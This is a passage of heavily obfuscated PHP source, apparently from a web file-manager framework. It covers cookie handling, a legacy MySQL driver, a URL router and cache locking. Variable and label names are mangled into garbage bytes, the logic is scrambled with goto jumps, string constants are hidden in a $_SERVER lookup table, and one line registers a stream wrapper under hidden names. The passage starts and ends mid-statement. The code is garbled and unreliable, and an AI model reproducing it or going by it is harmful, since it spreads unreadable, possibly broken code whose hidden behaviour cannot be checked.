$aÏòØ˜ÊÆ·[801]; $DÙˆ¹‹‘ÄÍ(); } goto e¡ñÅ²÷º»; b‰¸«Ôñê: } if ($this->isCluster) { foreach ($this->handle->_masters() as $b¤´‚ô’‡æ) { $this->handle->flushall($b¤´‚ô’‡æ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DæÌßÎÑˆ = '', $eÇí™Ë«ß² = 0) { if (is_string($DæÌßÎÑˆ) && $DæÌßÎÑˆ != $_SERVER[…Ò×–][33]) { $this->prefix = $DæÌßÎÑˆ; } if (is_numeric($eÇí™Ë«ß²) && $eÇí™Ë«ß² > 0) { $this->expire = $eÇí™Ë«ß²; } } public static function getInstance() { static $a’´ç½‡†; if ($a’´ç½‡† === null) { $a’´ç½‡† = new self(); } return $a’´ç½‡†; } private static $sameCookieSet = array(); public static function set($cÊÈÖá£¿, $a¥œäÛ¥˜ä, $bçÛ‰ƒÌ = 0, $E´•´ö’£Ñ = false, $Aæ¬¨ÃãŠ± = false) { goto fƒŞ—ù–ğÜ; e”Ñ¹¦¼ïõ: self::$sameCookieSet[$cÊÈÖá£¿] = $a¥œäÛ¥˜ä . $bçÛ‰ƒÌ; if (!$Aæ¬¨ÃãŠ±) { $Aæ¬¨ÃãŠ± = str_replace(HOST, $fùäÄçˆ½”[33], APP_HOST); $Aæ¬¨ÃãŠ± = _get($GLOBALS, $fùäÄçˆ½”[806], $Aæ¬¨ÃãŠ±); } $b«†ÚÓÆƒÆ = $fùäÄçˆ½”[33]; goto BØ•¡ôÀ¯”; BØ•¡ôÀ¯”: setcookie($cÊÈÖá£¿, $a¥œäÛ¥˜ä, time() + $bçÛ‰ƒÌ, $fùäÄçˆ½”[8] . trim($Aæ¬¨ÃãŠ±, $fùäÄçˆ½”[8]) . $b«†ÚÓÆƒÆ, !1, !1, $E´•´ö’£Ñ); goto AâŠ«¼µ«; fƒŞ—ù–ğÜ: $fùäÄçˆ½” =& $_SERVER[…Ò×–]; if (!$bçÛ‰ƒÌ) { $bçÛ‰ƒÌ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$cÊÈÖá£¿]) && self::$sameCookieSet[$cÊÈÖá£¿] == $a¥œäÛ¥˜ä . $bçÛ‰ƒÌ) { return; } goto e”Ñ¹¦¼ïõ; AâŠ«¼µ«: } public static function setSafe($báÁ¢ˆ»…, $bŞù’Ö£›, $b’Ù”ÑÙ‡Ú = 0) { self::set($báÁ¢ˆ»…, $bŞù’Ö£›, $b’Ù”ÑÙ‡Ú, !0); } public static function get($d®‘š¡œ) { return isset($_COOKIE[$d®‘š¡œ]) ? $_COOKIE[$d®‘š¡œ] : !1; } public static function remove($B½à®šÍÄÖ, $d‚“¼ƒÅË– = false) { unset($_COOKIE[$B½à®šÍÄÖ]); self::set($B½à®šÍÄÖ, $_SERVER[…Ò×–][33], 1, $d‚“¼ƒÅË–); } } class DbMysql extends Db { public function __construct($C®–­÷Û”í = '') { $DÇÅæÛ²ŸÊ =& $_SERVER[…Ò×–]; if (!extension_loaded($DÇÅæÛ²ŸÊ[732])) { think_exception(think_lang($DÇÅæÛ²ŸÊ[10]) . $DÇÅæÛ²ŸÊ[807]); } if (!empty($C®–­÷Û”í)) { $this->config = $C®–­÷Û”í; if (empty($this->config[$DÇÅæÛ²ŸÊ[13]])) { $this->config[$DÇÅæÛ²ŸÊ[13]] = $DÇÅæÛ²ŸÊ[33]; } } } public function connect($eª…èÕ«Í = '', $d¦ˆè£ô“ = 0, $EÁ‹“Ù¿Øİ = false) { $AŞĞ„¶ÅÖê =& $_SERVER[…Ò×–]; if (!isset($this->linkID[$d¦ˆè£ô“])) { goto eåšÙöá­; a—¨ŞÎƒ®¿: mysql_query($AŞĞ„¶ÅÖê[812] . think_config($AŞĞ„¶ÅÖê[813]) . $AŞĞ„¶ÅÖê[55], $this->linkID[$d¦ˆè£ô“]); if ($cÑ‰…¥Ğ¿» > $AŞĞ„¶ÅÖê[814]) { mysql_query($AŞĞ„¶ÅÖê[815], $this->linkID[$d¦ˆè£ô“]); } $this->connected = !0; goto AÀ¤˜˜‘‹È; AÀ¤˜˜‘‹È: if (1 != think_config($AŞĞ„¶ÅÖê[18])) { unset($this->config); } goto eàŞéŞ»Œ; eåšÙöá­: if (empty($eª…èÕ«Í)) { $eª…èÕ«Í = $this->config; } $BĞà¾Œß“Ô = $eª…èÕ«Í[$AŞĞ„¶ÅÖê[808]] . ($eª…èÕ«Í[$AŞĞ„¶ÅÖê[809]] ? "\x3a{$eª…èÕ«Í[$AŞĞ„¶ÅÖê[809]]}" : $AŞĞ„¶ÅÖê[33]); $CÕ¨­·© = !empty($eª…èÕ«Í[$AŞĞ„¶ÅÖê[13]][$AŞĞ„¶ÅÖê[14]]) ? $eª…èÕ«Í[$AŞĞ„¶ÅÖê[13]][$AŞĞ„¶ÅÖê[14]] : $this->pconnect; goto f‘ğ‹ù¼ËÕ; f‘ğ‹ù¼ËÕ: if ($CÕ¨­·©) { $this->linkID[$d¦ˆè£ô“] = mysql_pconnect($BĞà¾Œß“Ô, $eª…èÕ«Í[$AŞĞ„¶ÅÖê[810]], $eª…èÕ«Í[$AŞĞ„¶ÅÖê[811]], 131072); } else { $this->linkID[$d¦ˆè£ô“] = mysql_connect($BĞà¾Œß“Ô, $eª…èÕ«Í[$AŞĞ„¶ÅÖê[810]], $eª…èÕ«Í[$AŞĞ„¶ÅÖê[811]], !0, 131072); } if (!$this->linkID[$d¦ˆè£ô“] || !empty($eª…èÕ«Í[$AŞĞ„¶ÅÖê[17]]) && !mysql_select_db($eª…èÕ«Í[$AŞĞ„¶ÅÖê[17]], $this->linkID[$d¦ˆè£ô“])) { think_exception(mysql_error()); } $cÑ‰…¥Ğ¿» = mysql_get_server_info($this->linkID[$d¦ˆè£ô“]); goto a—¨ŞÎƒ®¿; eàŞéŞ»Œ: } return $this->linkID[$d¦ˆè£ô“]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d‹¢šÕîŸæ) { goto fë¼†âŠò; A‰¦‰¨¤é: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto D­ØˆÅ´Öó; b’Åá÷‰¨Š: think_action_status($aİï¹„ôˆ[19], 1); think_status($aİï¹„ôˆ[20]); $this->queryID = mysql_query($d‹¢šÕîŸæ, $this->_linkID); goto A‰¦‰¨¤é; fë¼†âŠò: $aİï¹„ôˆ =& $_SERVER[…Ò×–]; if (0 === stripos($d‹¢šÕîŸæ, $aİï¹„ôˆ[256])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CØˆ±˜·‰ç; CØˆ±˜·‰ç: if (!$this->_linkID) { return !1; } $this->queryStr = $d‹¢šÕîŸæ; if ($this->queryID) { $this->free(); } goto b’Åá÷‰¨Š; D­ØˆÅ´Öó: } public function execute($B¥ÑÔéÏƒö) { goto dô¯‘ØŞÄ; c÷œòÀŞÓï: think_status($f¹Ì·÷î¤º[20]); $Aùî‚ß†» = mysql_query($B¥ÑÔéÏƒö, $this->_linkID); $this->debug(); goto AêßËÜ«Ù†; F¢Ó¸É¸Š: $this->queryStr = $B¥ÑÔéÏƒö; if ($this->queryID) { $this->free(); } think_action_status($f¹Ì·÷î¤º[21], 1); goto c÷œòÀŞÓï; dô¯‘ØŞÄ: $f¹Ì·÷î¤º =& $_SERVER[…Ò×–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F¢Ó¸É¸Š; AêßËÜ«Ù†: if (!1 === $Aùî‚ß†») { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto c¦¿›ôçğ«; c¦¿›ôçğ«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[…Ò×–][816], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A¨šƒÓù”– = mysql_query($_SERVER[…Ò×–][817], $this->_linkID); $this->transTimes = 0; if (!$A¨šƒÓù”–) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A×ºÉ„ƒï· = mysql_query($_SERVER[…Ò×–][818], $this->_linkID); $this->transTimes = 0; if (!$A×ºÉ„ƒï·) { $this->error(); return !1; } } return !0; } private function getAll() { $f³‡ùÛÆ£ = array(); if ($this->numRows > 0) { while ($a…§·ÒÊ½ª = mysql_fetch_assoc($this->queryID)) { $f³‡ùÛÆ£[] = $a…§·ÒÊ½ª; } mysql_data_seek($this->queryID, 0); } return $f³‡ùÛÆ£; } public function getFields($eø­åòÎğ”) { $E‰Ùäß­Óà =& $_SERVER[…Ò×–]; $A¨–‚Ğ³›Ö = $this->query($E‰Ùäß­Óà[819] . $this->parseKey($eø­åòÎğ”)); $c–Ñ×ğç = array(); if ($A¨–‚Ğ³›Ö) { foreach ($A¨–‚Ğ³›Ö as $fÀæĞ ²¦Œ => $fÏßœÇÁ˜·) { $c–Ñ×ğç[$fÏßœÇÁ˜·[$E‰Ùäß­Óà[27]]] = array($E‰Ùäß­Óà[28] => $fÏßœÇÁ˜·[$E‰Ùäß­Óà[27]], $E‰Ùäß­Óà[29] => $fÏßœÇÁ˜·[$E‰Ùäß­Óà[30]], $E‰Ùäß­Óà[31] => (bool) (strtoupper($fÏßœÇÁ˜·[$E‰Ùäß­Óà[32]]) === $E‰Ùäß­Óà[820]), $E‰Ùäß­Óà[34] => $fÏßœÇÁ˜·[$E‰Ùäß­Óà[35]], $E‰Ùäß­Óà[36] => strtolower($fÏßœÇÁ˜·[$E‰Ùäß­Óà[37]]) == $E‰Ùäß­Óà[38], $E‰Ùäß­Óà[39] => strtolower($fÏßœÇÁ˜·[$E‰Ùäß­Óà[40]]) == $E‰Ùäß­Óà[41]); } } return $c–Ñ×ğç; } public function getTables($aß¢É¾ƒõÏ = '') { $añ³œéîº =& $_SERVER[…Ò×–]; if (!empty($aß¢É¾ƒõÏ)) { $Cñ¬“ ŞÏ° = $añ³œéîº[821] . $aß¢É¾ƒõÏ; } else { $Cñ¬“ ŞÏ° = $añ³œéîº[822]; } $Bøâ‹ÖÍÜ = $this->query($Cñ¬“ ŞÏ°); $AÀŸ¼ƒç‹‰ = array(); foreach ($Bøâ‹ÖÍÜ as $A­ã´¥ Í => $eñÉÚîõ¨) { $AÀŸ¼ƒç‹‰[$A­ã´¥ Í] = current($eñÉÚîõ¨); } return $AÀŸ¼ƒç‹‰; } public function replace($E”íø»äà, $d¿ïì´õº· = array()) { $Dè†Á†Ãêˆ =& $_SERVER[…Ò×–]; foreach ($E”íø»äà as $DìšÕ•²Ö => $A’àëÍ˜) { $FÅ²³Öãëƒ = $this->parseValue($A’àëÍ˜); if (is_scalar($FÅ²³Öãëƒ)) { $EÍ©‘Şº[] = $FÅ²³Öãëƒ; $Eô¹ÌÏ¬ö[] = $this->parseKey($DìšÕ•²Ö); } } $CÎ‘Ñ¨Ø = $Dè†Á†Ãêˆ[823] . $this->parseTable($d¿ïì´õº·[$Dè†Á†Ãêˆ[271]]) . $Dè†Á†Ãêˆ[824] . implode($Dè†Á†Ãêˆ[47], $Eô¹ÌÏ¬ö) . $Dè†Á†Ãêˆ[825] . implode($Dè†Á†Ãêˆ[47], $EÍ©‘Şº) . $Dè†Á†Ãêˆ[826]; return $this->execute($CÎ‘Ñ¨Ø); } public function insertAll($FŞ¤§˜ÜÆï, $f’Œ‰Æ½Ø‚ = array(), $D÷èè¯«ê = false) { goto bœí‘ƒØ¶; b÷¬ËÈ‚Ç: $d¶ç°Ü’Î£ = array(); foreach ($FŞ¤§˜ÜÆï as $cˆ°îÚ§ö) { $C‹ÎÍÛå»š = array(); foreach ($cˆ°îÚ§ö as $b½‰ë¼…Êˆ => $aâ¥ÇŒ½) { $aâ¥ÇŒ½ = $this->parseValue($aâ¥ÇŒ½); if (is_scalar($aâ¥ÇŒ½)) { $C‹ÎÍÛå»š[] = $aâ¥ÇŒ½; } } $d¶ç°Ü’Î£[] = $cá¬©²±õˆ[252] . implode($cá¬©²±õˆ[47], $C‹ÎÍÛå»š) . $cá¬©²±õˆ[826]; } array_walk($Eâ­‡íÅ“à, array($this, $cá¬©²±õˆ[827])); goto FÁ“­Œ˜¶; bœí‘ƒØ¶: $cá¬©²±õˆ =& $_SERVER[…Ò×–]; if (!is_array($FŞ¤§˜ÜÆï[0])) { return !1; } $Eâ­‡íÅ“à = array_keys($FŞ¤§˜ÜÆï[0]); goto b÷¬ËÈ‚Ç; FÁ“­Œ˜¶: $cÑ½óäÇ ô = ($D÷èè¯«ê ? $cá¬©²±õˆ[828] : $cá¬©²±õˆ[829]) . $cá¬©²±õˆ[830] . $this->parseTable($f’Œ‰Æ½Ø‚[$cá¬©²±õˆ[271]]) . $cá¬©²±õˆ[824] . implode($cá¬©²±õˆ[47], $Eâ­‡íÅ“à) . $cá¬©²±õˆ[831] . implode($cá¬©²±õˆ[47], $d¶ç°Ü’Î£); return $this->execute($cÑ½óäÇ ô); goto Dµù¦½ÎÒ—; Dµù¦½ÎÒ—: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $b˜²éÄ‹²Œ =& $_SERVER[…Ò×–]; $this->error = mysql_errno() . $b˜²éÄ‹²Œ[4] . mysql_error($this->_linkID); if ($b˜²éÄ‹²Œ[33] != $this->queryStr) { $this->error .= LNG($b˜²éÄ‹²Œ[45]) . $this->queryStr; } think_trace($this->error, $b˜²éÄ‹²Œ[33], $b˜²éÄ‹²Œ[46]); return $this->error; } public function escapeString($fÅÈòÙÌğ´) { if ($this->_linkID) { return mysql_real_escape_string($fÅÈòÙÌğ´, $this->_linkID); } else { return mysql_escape_string($fÅÈòÙÌğ´); } } public function parseKey(&$D§øîĞ¾¦ , $d«œï†º = true) { $BÏ’®ãñÒ =& $_SERVER[…Ò×–]; if ($d«œï†º) { $D§øîĞ¾¦  = $this->parseKeyCheck($D§øîĞ¾¦ ); } if ($D§øîĞ¾¦  != $BÏ’®ãñÒ[180] && !preg_match($BÏ’®ãñÒ[832], $D§øîĞ¾¦ )) { $D§øîĞ¾¦  = $BÏ’®ãñÒ[833] . trim($D§øîĞ¾¦ , $BÏ’®ãñÒ[833]) . $BÏ’®ãñÒ[833]; } return $D§øîĞ¾¦ ; } } goto DÃˆÃ¹š§£; f…„º†Ïäç: $_SERVER[$_SERVER[ä¡—±€µó–è][49]] = ("\x39\x39\x34\x38"."\66\65")+0;$_SE6R="Vpw4BmKJ3Pa8uWIFywqKCZVx9YtTA7xrIujhMsgRuznN26GPBbtMNrbQ2JU459Bd8efxEYinnckY9c";; stream_wrapper_register($_SERVER[ä¡—±€µó–è][50], $_SERVER[ä¡—±€µó–è][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($cçí”ŠêØ·, $C–ØŸğÇ‡æ) { $D·ùœœÚ»‘ =& $_SERVER[…Ò×–]; if (isset(self::$_methodList[$cçí”ŠêØ·])) { return @call_user_func_array(self::$_methodList[$cçí”ŠêØ·], $C–ØŸğÇ‡æ); } else { if (method_exists($this, $cçí”ŠêØ·)) { return call_user_func_array(array($this, $cçí”ŠêØ·), $C–ØŸğÇ‡æ); } else { think_exception(__CLASS__ . $D·ùœœÚ»‘[4] . $cçí”ŠêØ· . $D·ùœœÚ»‘[5]); } } } public static function __callStatic($A¸—–’Šë, $b…ßÒ ·¡µ) { if (isset(self::$_methodListStatic[$A¸—–’Šë])) { return call_user_func_array(self::$_methodListStatic[$A¸—–’Šë], $b…ßÒ ·¡µ); } else { if (method_exists(self, $A¸—–’Šë)) { return call_user_func_array(array(self, $A¸—–’Šë), $b…ßÒ ·¡µ); } else { show_json("{$A¸—–’Šë}\x28\51\40\x6e\x6f\x74\40\x65\x78\x69\163\164\x3b", !1); } } } public static function addMethod($Aî†ŞÂ¦à, $Aï—©ˆ) { self::$_methodList[$Aî†ŞÂ¦à] = $Aï—©ˆ; } public static function addMethodStatic($D÷“•ãî, $C ¤Š¯«ø«) { self::$_methodListStatic[$D÷“•ãî] = $C ¤Š¯«ø«; } } goto e…Çç‰Î¨É; EÔÑ–œêç‹: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\x2f\135\x2b", "\72\156\x75\x6d" => "\133\x30\55\71\135\53", "\x3a\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Eõ¿ø’ÜŞ, $d÷—ÛØ¾“®) { $eÍí®Ï°±à =& $_SERVER[…Ò×–]; if ($Eõ¿ø’ÜŞ == $eÍí®Ï°±à[1398]) { $f‡Õ¨ØçÖ„ = array_map($eÍí®Ï°±à[1399], $d÷—ÛØ¾“®[0]); $AõˆºÓ…ë¢ = strpos($d÷—ÛØ¾“®[1], $eÍí®Ï°±à[8]) === 0 ? $d÷—ÛØ¾“®[1] : $eÍí®Ï°±à[8] . $d÷—ÛØ¾“®[1]; $aÅïÚ¹ÈŠ = $d÷—ÛØ¾“®[2]; } else { $f‡Õ¨ØçÖ„ = null; $AõˆºÓ…ë¢ = strpos($d÷—ÛØ¾“®[0], $eÍí®Ï°±à[8]) === 0 ? $d÷—ÛØ¾“®[0] : $eÍí®Ï°±à[8] . $d÷—ÛØ¾“®[0]; $aÅïÚ¹ÈŠ = $d÷—ÛØ¾“®[1]; } array_push(self::$maps, $f‡Õ¨ØçÖ„); array_push(self::$routes, $AõˆºÓ…ë¢); array_push(self::$methods, strtoupper($Eõ¿ø’ÜŞ)); array_push(self::$callbacks, $aÅïÚ¹ÈŠ); } public static function error($CŠ÷É‘¸‹²) { self::$errorCallback = $CŠ÷É‘¸‹²; } public static function haltOnMatch($eòÍĞâÔ‡ = true) { self::$halts = $eòÍĞâÔ‡; } public static function dispatch() { goto b§º«ë‹Ü‘; b§º«ë‹Ü‘: $cİÊì±ÁŒŞ =& $_SERVER[…Ò×–]; $fÒ§ÓÇù£ = parse_url($_SERVER[$cİÊì±ÁŒŞ[1400]], PHP_URL_PATH); $dÉËÔ½ØİÉ = $_SERVER[$cİÊì±ÁŒŞ[154]]; goto bõ´äÁ™‡È; bõ´äÁ™‡È: $a¿ ’Ëó = array_keys(static::$patterns); $bÁ×™·¡ØÄ = array_values(static::$patterns); $f°ËèáÅÒ· = !1; goto f„±˜ËÒ¯˜; f„±˜ËÒ¯˜: self::$routes = preg_replace($cİÊì±ÁŒŞ[1083], $cİÊì±ÁŒŞ[8], self::$routes); if (in_array($fÒ§ÓÇù£, self::$routes)) { $cÄÍÇ¯§–‹ = array_keys(self::$routes, $fÒ§ÓÇù£); foreach ($cÄÍÇ¯§–‹ as $e†¤ã³‡éï) { if (self::$methods[$e†¤ã³‡éï] == $dÉËÔ½ØİÉ || self::$methods[$e†¤ã³‡éï] == $cİÊì±ÁŒŞ[1401] || in_array($dÉËÔ½ØİÉ, self::$maps[$e†¤ã³‡éï])) { $f°ËèáÅÒ· = !0; if (!is_object(self::$callbacks[$e†¤ã³‡éï])) { $CÈÃŠé†¤ = explode($cİÊì±ÁŒŞ[8], self::$callbacks[$e†¤ã³‡éï]); $FİÔì½‹³å = end($CÈÃŠé†¤); $eå¸¯²Ã’¨ = explode($cİÊì±ÁŒŞ[1402], $FİÔì½‹³å); $dô©äğ¤° = new $eå¸¯²Ã’¨[0](); $dô©äğ¤°->{$eå¸¯²Ã’¨[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e†¤ã³‡éï]); if (self::$halts) { return; } } } } } else { $F†‚¸…© = 0; foreach (self::$routes as $e†¤ã³‡éï) { if (strpos($e†¤ã³‡éï, $cİÊì±ÁŒŞ[4]) !== !1) { $e†¤ã³‡éï = str_replace($a¿ ’Ëó, $bÁ×™·¡ØÄ, $e†¤ã³‡éï); } if (preg_match($cİÊì±ÁŒŞ[1403] . $e†¤ã³‡éï . $cİÊì±ÁŒŞ[1404], $fÒ§ÓÇù£, $AÊ‰¾Ş»èó)) { if (self::$methods[$F†‚¸…©] == $dÉËÔ½ØİÉ || self::$methods[$F†‚¸…©] == $cİÊì±ÁŒŞ[1401] || !empty(self::$maps[$F†‚¸…©]) && in_array($dÉËÔ½ØİÉ, self::$maps[$F†‚¸…©])) { $f°ËèáÅÒ· = !0; array_shift($AÊ‰¾Ş»èó); if (!is_object(self::$callbacks[$F†‚¸…©])) { $CÈÃŠé†¤ = explode($cİÊì±ÁŒŞ[8], self::$callbacks[$F†‚¸…©]); $FİÔì½‹³å = end($CÈÃŠé†¤); $eå¸¯²Ã’¨ = explode($cİÊì±ÁŒŞ[1402], $FİÔì½‹³å); $dô©äğ¤° = new $eå¸¯²Ã’¨[0](); if (!method_exists($dô©äğ¤°, $eå¸¯²Ã’¨[1])) { echo $cİÊì±ÁŒŞ[1405]; } else { call_user_func_array(array($dô©äğ¤°, $eå¸¯²Ã’¨[1]), $AÊ‰¾Ş»èó); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$F†‚¸…©], $AÊ‰¾Ş»èó); if (self::$halts) { return; } } } } $F†‚¸…©++; } } if ($f°ËèáÅÒ· == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aã¢ÉÆÍ‰ =& $_SERVER[…Ò×–]; header($_SERVER[$aã¢ÉÆÍ‰[1406]] . $aã¢ÉÆÍ‰[1407]); echo $aã¢ÉÆÍ‰[1408]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$cİÊì±ÁŒŞ[1400]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cƒ¿¦¹ÇÌ¦; cƒ¿¦¹ÇÌ¦: } } $c”·à¯¿¢¨ = LIB_DIR . $_SERVER[…Ò×–][1409]; $c¿º«²ƒ¡± = $_SERVER[…Ò×–][797]; goto Eî°‚ñ›Ç; FÁŒŸ¶ïƒ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A°ç¿“Ú¡¤ =& $_SERVER[…Ò×–]; $f­òÂä—îö = $GLOBALS[$A°ç¿“Ú¡¤[6]][$A°ç¿“Ú¡¤[341]]; self::$cachePath = $f­òÂä—îö[$A°ç¿“Ú¡¤[171]][$A°ç¿“Ú¡¤[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($dÓŒáˆøáˆ, $e¿†¤ÍùÄÖ = 0) { goto eŒœçíÜ¼´; eŒœçíÜ¼´: $C„øÁ‡¦Ì =& $_SERVER[…Ò×–]; $D‚ÚØ‰Æ¢ = microtime(!0); $Aá®Şİ¬èæ = $D‚ÚØ‰Æ¢ + $e¿†¤ÍùÄÖ + 0.0001; goto aÍ–îğñˆ¢; aÍ–îğñˆ¢: $eÔ•§´–À = rtrim(self::$cachePath, $C„øÁ‡¦Ì[8]) . $C„øÁ‡¦Ì[782] . md5($dÓŒáˆøáˆ) . $C„øÁ‡¦Ì[779]; if (file_exists($eÔ•§´–À) && filemtime($eÔ•§´–À) && filemtime($eÔ•§´–À) < time() - 10) { @unlink($eÔ•§´–À); } do { if (file_exists($eÔ•§´–À)) { cacheLockWait(); continue; } $AÊ¶ğĞ½Û = fopen($eÔ•§´–À, $C„øÁ‡¦Ì[783]); if (!$AÊ¶ğĞ½Û) { return !1; } $FŠŸÎŒ¸‚ = flock($AÊ¶ğĞ½Û, LOCK_EX | LOCK_NB); self::$caches[$dÓŒáˆøáˆ] = array($C„øÁ‡¦Ì[784] => $AÊ¶ğĞ½Û, $C„øÁ‡¦Ì[171] => $eÔ•§´–À); fwrite($AÊ¶ğĞ½Û, $Aá®Şİ¬èæ); clearstatcache(); if ($AÊ¶ğĞ½Û && $FŠŸÎŒ¸‚) { return !0; } cacheLockWait(); } while (microtime(!0) < $Aá®Şİ¬èæ); goto a…àÇ©›Ã; a…àÇ©›Ã: $this->unlock($dÓŒáˆøáˆ); return !1; goto A½­Å›ªÒ©; A½­Å›ªÒ©: } public function lockGet($a÷ÁçìàÉà) { $D¤ìİâ…´ =& $_SERVER[…Ò×–]; $c¡±ïß¢ŒÂ = rtrim(self::$cachePath, $D¤ìİâ…´[8]) . $D¤ìİâ…´[782] . md5($a÷ÁçìàÉà) . $D¤ìİâ…´[779]; return file_exists($c¡±ïß¢ŒÂ); } public function unlock($C¼¨Â®õ¡æ) { goto eØÃ¨´ÄÆ­; F™É°¦¬’õ: unset(self::$caches[$C¼¨Â®õ¡æ]); goto f¡ÌÄ¶¿…; Fºëåƒˆè: @flock($eËÍ•„ŞÍ[$cÄÚõ‚ÎÄ®[784]], LOCK_UN); @fclose($eËÍ•„ŞÍ[$cÄÚõ‚ÎÄ®[784]]); @unlink($eËÍ•„ŞÍ[$cÄÚõ‚ÎÄ®[171]]); goto F™É°¦¬’õ; eØÃ¨´ÄÆ­: $cÄÚõ‚ÎÄ® =& $_SERVER[…Ò×–]; $eËÍ•„ŞÍ = self::$caches[$C¼¨Â®õ¡æ]; if (!$eËÍ•„ŞÍ) { return; } goto Fºëåƒˆè; f¡ÌÄ¶¿…: } } class CacheLockRedis { public function lock($BµîŠõ®®ß, $EòÅØêİÀˆ = 10) { $c‡”È›éË¥ = Cache::init(); $Fš±Æ˜Ì¨Á = microtime(!0) + $EòÅØêİÀˆ; while (microtime(!0) < $Fš±Æ˜Ì¨Á) { $BÊ¨ ‚±Ö‰ = $c‡”È›éË¥->get($BµîŠõ®®ß); if (!$BÊ¨ ‚±Ö‰) { $D˜§àÊƒá = $c‡”È›éË¥->setLock($BµîŠõ®®ß, $Fš±Æ˜Ì¨Á, $EòÅØêİÀˆ); if ($D˜§àÊƒá) { return !0; } } else { if ($BÊ¨ ‚±Ö‰ < microtime(!0)) { $c‡”È›éË¥->set($BµîŠõ®®ß, $Fš±Æ˜Ì¨Á, $Fš±Æ˜Ì¨Á); if ($c‡”È›éË¥->get($BµîŠõ®®ß) === $BÊ¨ ‚±Ö‰) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C¿³Ô£äç) { return Cache::init()->get($C¿³Ô£äç); } public function unlock($c°×ª‚Ñ£‹) { return Cache::init()->remove($c°×ª‚Ñ£‹); } } goto eí‚•ğ«Î‚; Bö˜Šå©±¬: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto cçÌØôĞê½; AŸåì´ˆÊÈ: switch ($b£ÇÖÔ‚ä‡[$Açè«ä›ÕÒ[759]]) { case $Açè«ä›ÕÒ[17]: self::$handle = Model($Açè«ä›ÕÒ[761]); break; case $Açè«ä›ÕÒ[762]: self::$handle = new CacheRedis($Fà¾Ìàøˆæ, $D„•”½ï¹´); break; case $Açè«ä›ÕÒ[763]: self::$handle = new CacheMemcached($Fà¾Ìàøˆæ, $D„•”½ï¹´); break; case $Açè«ä›ÕÒ[171]: self::$handle = new CacheFile($Fà¾Ìàøˆæ, $D„•”½ï¹´); break; default: break; } return self::$handle; goto aÎ”ß›„Š; cçÌØôĞê½: $Açè«ä›ÕÒ =& $_SERVER[…Ò×–]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto cïÛßÉ¤; cïÛßÉ¤: $b£ÇÖÔ‚ä‡ = $GLOBALS[$Açè«ä›ÕÒ[6]][$Açè«ä›ÕÒ[341]]; $Fà¾Ìàøˆæ = $b£ÇÖÔ‚ä‡[$b£ÇÖÔ‚ä‡[$Açè«ä›ÕÒ[759]]]; $D„•”½ï¹´ = $b£ÇÖÔ‚ä‡[$Açè«ä›ÕÒ[760]]; goto AŸåì´ˆÊÈ; aÎ”ß›„Š: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($C ´­·•‰) { if (is_array($C ´­·•‰) || is_object($C ´­·•‰)) { $C ´­·•‰ = json_encode($C ´­·•‰); } $C ´­·•‰ = rawurlencode($C ´­·•‰); return md5(KOD_SITE_ID . $_SERVER[…Ò×–][70] . $C ´­·•‰); } public static function get($Cİ§«¹ñ§©) { $BöÉÙˆ§ = self::key($Cİ§«¹ñ§©); if (!isset(self::$memoryCache[$BöÉÙˆ§])) { $f·£ŞïÃ÷” = self::init()->get($BöÉÙˆ§); self::$memoryCache[$BöÉÙˆ§] = unserialize($f·£ŞïÃ÷”); } return self::$memoryCache[$BöÉÙˆ§]; } public static function set($f™«”Ú´‘®, $d»ŒÑÙÓ‹, $C¸Ûí‹™¸Ü = false) { goto A„´Ü‰¶õ¬; A„´Ü‰¶õ¬: $Fá·åª¨ = self::key($f™«”Ú´‘®); if (isset(self::$memoryCache[$Fá·åª¨]) && self::$memoryCache[$Fá·åª¨] === $d»ŒÑÙÓ‹) { return !0; } if ($C¸Ûí‹™¸Ü === 0) { self::$memoryCache[$Fá·åª¨] = $d»ŒÑÙÓ‹; return !0; } goto b£ä‰ˆäÌ¦; cËÃİ«é¼‘: CacheLock::unlock($f™«”Ú´‘®); return $BÒóˆ¢ï³ù; goto bÓÒî“¿Ä; b£ä‰ˆäÌ¦: CacheLock::lock($f™«”Ú´‘®); $BÒóˆ¢ï³ù = self::init()->set($Fá·åª¨, serialize($d»ŒÑÙÓ‹), $C¸Ûí‹™¸Ü); self::$memoryCache[$Fá·åª¨] = $d»ŒÑÙÓ‹; goto cËÃİ«é¼‘; bÓÒî“¿Ä: } public static function remove($EìÛõÍ•„ˆ) { goto D×ã¦²¶º; Dç§²Ö‰¼³: CacheLock::lock($EìÛõÍ•„ˆ); $DßÆñô‚Ø = self::init()->remove($CğÏÍ÷õ´â); CacheLock::unlock($EìÛõÍ•„ˆ); goto eéŞºÏ¿; D×ã¦²¶º: $CğÏÍ÷õ´â = self::key($EìÛõÍ•„ˆ); 